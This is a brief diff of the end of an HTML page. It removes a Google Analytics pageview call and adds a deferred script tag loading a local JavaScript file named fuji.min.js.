-ga('send', 'pageview');
+<script defer src="/assets/js/fuji.min.js"></script>
 
-</script>
+
 
 </body>
+
 </html>
